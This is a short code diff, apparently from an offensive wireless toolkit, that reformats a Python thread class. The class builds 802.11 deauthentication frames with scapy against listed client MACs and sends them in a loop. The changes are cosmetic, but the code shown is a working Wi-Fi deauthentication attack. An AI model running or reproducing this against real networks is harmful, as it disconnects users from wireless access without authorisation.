@@ -41,10 +41,7 @@ class ThreadDeauth(QThread):
             )
             / Dot11Deauth(reason=7)
         )
-        pkt2 = (
-            Dot11(addr1=bssid, addr2=client, addr3=client)
-            / Dot11Deauth()
-        )
+        pkt2 = Dot11(addr1=bssid, addr2=client, addr3=client) / Dot11Deauth()
         self.pkts.append(pkt1)
         self.pkts.append(pkt2)
 
@@ -59,7 +56,7 @@ class ThreadDeauth(QThread):
         conf.iface = self.interface
         for target in self._mac_blacklist:
             self.build_packetRadioTap(target, self.client)
-            
+
         while self.status:
             for packet in self.pkts:
                 sendp(packet, verbose=False, count=1, iface=self.interface)
